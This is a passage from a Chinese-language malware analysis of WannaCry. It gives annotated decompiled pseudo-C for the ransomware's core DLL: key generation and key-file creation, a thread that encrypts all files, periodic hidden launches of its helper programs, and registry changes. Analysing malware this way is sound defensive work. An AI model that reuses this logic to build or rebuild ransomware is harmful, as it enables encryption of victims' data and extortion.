<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span>_DWORD <span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token punctuation">)</span>pHeapBase <span class="token operator">+</span> <span class="token number">0x7C</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  

<span class="token keyword">goto</span> LABEL_12<span class="token punctuation">;</span>  

ExportRVA <span class="token operator">=</span> DataDirectory<span class="token punctuation">;</span>                   <span class="token comment">// 取出数据目录表的第一项->导出表的RVA  </span>

NumberOfNames <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token punctuation">)</span><span class="token punctuation">(</span>DataDirectory <span class="token operator">+</span> AllocBase <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 取出以名称方式导出的函数数量  </span>

ExportVA <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token punctuation">)</span><span class="token punctuation">(</span>AllocBase <span class="token operator">+</span> ExportRVA<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 基址+导出表的RVA=导出表的VA  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>该函数有两个参数 堆空间的首地址 和TaskStart这个字符串<br>并返回了导出函数地址</p>
<p>对于函数逻辑：这个函数首先取出了数据目录表，并根据数据目录表找到了导出表，接着我们看一下dll文件的导出表：</p>
<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image18.png" class="" width="18">

<p>图十六：t_wnry.dll 导出表</p>
<p>得知TaskStart就是传进去的第二个参数</p>
<h2 id="5-4-小结"><a href="#5-4-小结" class="headerlink" title="5.4 小结"></a>5.4 小结</h2><ol>
<li><p> 获取必要的API函数地址</p>
</li>
<li><p> 导入私钥并申请空间</p>
</li>
<li><p> 用导入的私钥解密出一个dll</p>
</li>
<li><p> 申请一块堆空间 将dll写入到堆内存里</p>
</li>
<li><p> 在堆内存中找到dll的导出函数地址 并调用</p>
</li>
</ol>
<p>从上面的分析可以得出病毒的主体程序实际上只做了一些初始化的操作<br>到目前为止并没有看到它感染或加密任何一个文件 也没有对用户进行勒索<br>真正的核心代码在t.wnry中 由于这个函数是在堆空间中调用<br>所以在IDA中并没有显示出伪C代码 那么接下来需要分析刚刚提取出来的dll</p>
<h2 id="5-5-加载病毒核心操作"><a href="#5-5-加载病毒核心操作" class="headerlink" title="5.5 加载病毒核心操作"></a>5.5 加载病毒核心操作</h2><p>在这部分所涉及的函数的操作都只有一个目的，即利用dll文件中的导出函数，下面我们分步进行分析</p>
<h3 id="5-3-1-GetApis-获取必要的API函数-1"><a href="#5-3-1-GetApis-获取必要的API函数-1" class="headerlink" title="5.3.1 GetApis 获取必要的API函数"></a>5.3.1 GetApis 获取必要的API函数</h3><h1 id="6-t-wnry-dll-病毒核心部分分析"><a href="#6-t-wnry-dll-病毒核心部分分析" class="headerlink" title="6 t.wnry.dll 病毒核心部分分析"></a>6 t.wnry.dll 病毒核心部分分析</h1><h2 id="6-1-主体逻辑"><a href="#6-1-主体逻辑" class="headerlink" title="6.1 主体逻辑"></a>6.1 主体逻辑</h2><p>t.wnry.dll<br>作为病毒的核心部分，包括了病毒所有的危害操作，包括加密解密文件，勒索用户等有害操作，下面我将为大家一步步的进行分析：</p>
<h3 id="6-1-1-TaskStart-病毒的逻辑主体函数"><a href="#6-1-1-TaskStart-病毒的逻辑主体函数" class="headerlink" title="6.1.1 TaskStart 病毒的逻辑主体函数"></a>6.1.1 TaskStart 病毒的逻辑主体函数</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __stdcall <span class="token function">TaskStart</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">||</span> <span class="token function">RunSingle</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>                      <span class="token comment">// 互斥体防双开  </span>

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

Filename <span class="token operator">=</span> word_1000D918<span class="token punctuation">;</span>                     <span class="token comment">// 初始化缓冲区  </span>

<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v12<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x204u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

v13 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token function">GetModuleFileNameW</span><span class="token punctuation">(</span>hModule<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Filename<span class="token punctuation">,</span> <span class="token number">0x103u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取当前进程的完整路径  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">wcsrchr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Filename<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token operator">*</span><span class="token function">wcsrchr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Filename<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>              <span class="token comment">// 获取到字符串->.wcry.exe   </span>

<span class="token function">SetCurrentDirectoryW</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Filename<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">ReadFileToMem</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_wnryBase<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>         <span class="token comment">// 读取c.wnry到内存  </span>

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

StartIsSuccess <span class="token operator">=</span> <span class="token function">GetUsersidAndCmp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 获取当前用户的SID并与系统的SID作比较  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">GetApis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>                             <span class="token comment">// 获取必要的API函数地址  </span>

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token function">sprintf</span><span class="token punctuation">(</span>FileName_0<span class="token punctuation">,</span> a08xRes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// Dest=00000000.res  </span>

<span class="token function">sprintf</span><span class="token punctuation">(</span>FileName<span class="token punctuation">,</span> a08xPky<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// FileName=00000000.pky  </span>

<span class="token function">sprintf</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> a08xEky<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// buff=00000000.eky  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">SetAccessControl</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">sub_10004500</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> 

<span class="token comment">// 1.设置访问控制属性 2.判断是否存在00000000.pky这个文件 由于不存在 直接return  </span>

<span class="token punctuation">&#123;</span>  

hThread <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>StartExeAndSetReg<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 条件不成立 跳过这个if分支 隐藏分支待分析  </span>

<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token function">CloseHandle</span><span class="token punctuation">(</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

lpAddress <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span>operator <span class="token function">new</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 申请一块内存空间  </span>

v14 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> lpAddress <span class="token punctuation">)</span>  

v3 <span class="token operator">=</span> <span class="token function">InitializeCriSection</span><span class="token punctuation">(</span>lpAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 初始化临界区  </span>

<span class="token keyword">else</span>

v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

v14 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v3 <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">CreatePkyAndEky</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> FileName<span class="token punctuation">,</span> buff<span class="token punctuation">)</span> <span class="token punctuation">)</span>

<span class="token comment">// 创建00000000.pky和00000000.eky 一个是公钥 一个是加密后的私钥  </span>

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">OpenResFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> dword_1000DC70 <span class="token punctuation">)</span> <span class="token comment">// 打开00000000.res文件 </span>

<span class="token punctuation">&#123;</span>  

<span class="token function">DeleteFileA</span><span class="token punctuation">(</span>FileName_0<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>RandomBytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x88u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

dword_1000DC70 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token function">GetRandom</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HCRYPTPROV<span class="token punctuation">)</span>v3<span class="token punctuation">,</span> <span class="token operator">&amp;</span>RandomBytes<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取0x8个字节的随机数  </span>

<span class="token punctuation">&#125;</span>  

<span class="token function">DestoryHandle</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__thiscall <span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//隐藏函数 用于释放临界区  </span>

hThread_1 <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>CreateResFile<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 创建00000000.res文件  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> hThread_1 <span class="token punctuation">)</span>  

<span class="token function">CloseHandle</span><span class="token punctuation">(</span>hThread_1<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

hThread_2 <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>CheckDky<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 每隔五秒检测是否存在774F34B5.dky这个文件 由于文件不存在 直接return  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> hThread_2 <span class="token punctuation">)</span>  

<span class="token function">CloseHandle</span><span class="token punctuation">(</span>hThread_2<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

hThread_3 <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>EncryptAllFiles<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 加密所有文件  </span>

<span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

hThread_4 <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> StartTaskdl<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 每隔三秒以隐藏的方式启动taskdl.exe  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> hThread_4 <span class="token punctuation">)</span>  

<span class="token function">CloseHandle</span><span class="token punctuation">(</span>hThread_4<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

hThread_5 <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>StartExeAndSetReg<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 每隔三秒 启动taskse.exe和@WanaDecryptor@.exe并且修改注册表  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> hThread_5 <span class="token punctuation">)</span>  

<span class="token function">CloseHandle</span><span class="token punctuation">(</span>hThread_5<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token function">RepeatOperation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 创建批处理脚本</span>
加密器 Read_Me@<span class="token punctuation">.</span>txt 加密其他用户下的文件 

<span class="token keyword">if</span> <span class="token punctuation">(</span> hThread_3 <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>hThread_3<span class="token punctuation">,</span> INFINITE<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token function">CloseHandle</span><span class="token punctuation">(</span>hThread_3<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Dll 文件主题包括了病毒的所有操作：</p>
<ol>
<li><p> 初始 临界区，缓冲区，路径，字符串并将c.wnry读到内存</p>
</li>
<li><p> 建立 公钥，私钥文件，并加密所有文件</p>
</li>
<li><p> 每隔三秒 隐藏方式启动 taskdl.exe taskse.exe 等文件</p>
</li>
<li><p> 创建批处理脚本 加密器 Read_Me@.txt 加密其他用户下的文件</p>
</li>
</ol>
<h3 id="6-1-2-GetUsersidAndCmp-获取当前用户SID并与系统的SID作比较"><a href="#6-1-2-GetUsersidAndCmp-获取当前用户SID并与系统的SID作比较" class="headerlink" title="6.1.2 GetUsersidAndCmp 获取当前用户SID并与系统的SID作比较"></a>6.1.2 GetUsersidAndCmp 获取当前用户SID并与系统的SID作比较</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x254u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">// 将buff缓冲区清零  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">GetCurrentUserSID</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Buffer<span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token comment">// 获取当前用户的SID  </span>
<span class="token punctuation">&#123;</span>  
v0 <span class="token operator">=</span> <span class="token function">wcsicmp</span><span class="token punctuation">(</span>aS1518<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// 比较当前的SID是否是S-1-5-18->系统的SID  </span>
<span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>从注册表中获取到当前用户的SID并于系统的SID做比较</p>
<h3 id="6-1-3-CreatePkyAndEky-创建-pky-和-eky-文件"><a href="#6-1-3-CreatePkyAndEky-创建-pky-和-eky-文件" class="headerlink" title="6.1.3 CreatePkyAndEky 创建 pky 和 eky 文件"></a>6.1.3 CreatePkyAndEky 创建 pky 和 eky 文件</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">GetCSPHandle</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> this<span class="token punctuation">)</span> <span class="token punctuation">)</span>            <span class="token comment">// 获取CSP服务程序句柄  </span>

<span class="token punctuation">&#123;</span>  

<span class="token function">DestoryHandle</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token comment">// 如果失败则释放资源  </span>
<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> lpFileName <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">ImportPubKey</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> lpFileName<span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token comment">// 当00000000.pky不存在时 条件成立  </span>

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">CryptImportKey_Addr</span><span class="token punctuation">(</span>v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pbData<span class="token punctuation">,</span> <span class="token number">0x114</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v3 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token comment">// 导入RSA公钥  </span>
<span class="token operator">||</span> <span class="token operator">!</span><span class="token function">CryptGenKey</span><span class="token punctuation">(</span>v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment">// 生成可导出的2048位RSA签名密钥  </span>
<span class="token operator">||</span> <span class="token operator">!</span><span class="token function">CreatePkyFile</span><span class="token punctuation">(</span>v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">6u</span><span class="token punctuation">,</span> lpFileName<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 创建00000000.pky文件 并写入生成的RSA公钥  </span>

<span class="token punctuation">&#123;</span>  

<span class="token keyword">goto</span> LABEL_19<span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> pky_str <span class="token punctuation">)</span>  

<span class="token function">CreateEkyFile</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v3<span class="token punctuation">,</span> pky_str<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 创建00000000.eky文件 并写入加密后的RSA私钥  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">ImportPubKey</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> lpFileName<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token comment">// 导入00000000.pky的公钥  </span>

<span class="token punctuation">&#123;</span>  

BEL_19<span class="token operator">:</span>  

<span class="token function">DestoryHandle</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment">// 如果导入失败释放句柄  </span>

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token punctuation">&#125;</span>  

v5 <span class="token operator">=</span> v3<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                                 <span class="token comment">// 当00000000.pky存在时 直接退出函数  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个函数在当前路径里创建 pky 和 eky文件， pky为公钥，eky为加密后的私钥</p>
<h3 id="6-1-4-CreateResFile-线程回调-创建-res-文件"><a href="#6-1-4-CreateResFile-线程回调-创建-res-文件" class="headerlink" title="6.1.4 CreateResFile 线程回调+创建 res 文件"></a>6.1.4 CreateResFile 线程回调+创建 res 文件</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __stdcall __noreturn <span class="token function">CreateResFile</span><span class="token punctuation">(</span>LPVOID lpThreadParameter<span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">signed</span> <span class="token keyword">int</span> index<span class="token punctuation">;</span> <span class="token comment">// esi  </span>



<span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">!</span>dword_1000DD90 <span class="token punctuation">)</span>  
<span class="token punctuation">&#123;</span>  

SystemTime <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment">// 返回当前系统时间  </span>

<span class="token function">CreateRes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token comment">// 创建并写入00000000.res文件  </span>

index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token keyword">do</span>                                         <span class="token comment">// 休眠22秒  </span>
<span class="token punctuation">&#123;</span>  
<span class="token keyword">if</span> <span class="token punctuation">(</span> dword_1000DD90 <span class="token punctuation">)</span>  
<span class="token keyword">goto</span> LABEL_6<span class="token punctuation">;</span>  
<span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">1000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token operator">++</span>index<span class="token punctuation">;</span>  
<span class="token punctuation">&#125;</span>  

<span class="token keyword">while</span> <span class="token punctuation">(</span> index <span class="token operator">&lt;</span> <span class="token number">0x19</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token punctuation">&#125;</span>  

LABEL_6<span class="token operator">:</span>  
<span class="token function">ExitThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token comment">// 退出线程  </span>

<span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在当前工作路径创建了 res 文件，并往里写数据：</p>
<p>写入了 0x8个字节的随机数 和 0x4 个字节的当前时间</p>
<h3 id="6-1-5-CheckDky-线程回调-检测文件存在与否"><a href="#6-1-5-CheckDky-线程回调-检测文件存在与否" class="headerlink" title="6.1.5 CheckDky 线程回调+检测文件存在与否"></a>6.1.5 CheckDky 线程回调+检测文件存在与否</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __stdcall __noreturn <span class="token function">CheckDky</span><span class="token punctuation">(</span>LPVOID lpThreadParameter<span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

dword_1000DD8C <span class="token operator">=</span> <span class="token function">sub_10004500</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>lpThreadParameter<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 检测是否存在774F34B5.dky这个文件 由于文件不存在 直接return  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> dword_1000DD8C <span class="token punctuation">)</span>  

<span class="token keyword">break</span><span class="token punctuation">;</span>  

<span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">5000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token function">ExitThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
